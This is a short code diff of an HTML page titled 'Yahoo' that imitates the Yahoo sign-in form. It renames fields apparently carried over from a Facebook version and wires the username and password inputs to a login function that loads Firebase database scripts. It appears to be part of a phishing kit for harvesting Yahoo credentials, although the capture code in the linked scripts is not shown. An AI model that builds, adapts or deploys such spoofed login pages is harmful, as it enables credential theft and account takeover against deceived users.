@@ -6,8 +6,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Yahoo</title>
     <link rel="stylesheet" href="css/style.css" />
-    <script src="js/jquery-3.6.0.min.js"></script>
-    <script src="js/index.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
+    <script src="/js/index.js"></script>
 </head>
 <body>
     <div id="divf">
@@ -18,11 +18,11 @@
             </div>
             <h1 id="h1">Sign in</h1>
             <p id="p2">Sign in using your Yahoo account</p>
-            <input required id="fb-uname" type="email" placeholder="Username, email address or mobile number">
+            <input required id="yh-uname" type="email" placeholder="Username, email address or mobile number">
             <hr id="hr1">
-            <input required id="fb-pass" type="text" placeholder="Password">
+            <input required id="yh-pass" type="text" placeholder="Password">
             <hr id="hr1">
-            <button onclick="login()" id="fb-log" type="submit">Login</button>
+            <button onclick="yh_login()" id="yh-log" type="submit">Login</button>
             <br>
             <div>
                 <button id="b2">
@@ -51,6 +51,6 @@
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
     <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
-    <script src="js/firebase.js"></script>
+    <script src="/js/firebase.js"></script>
 </body>
 </html>
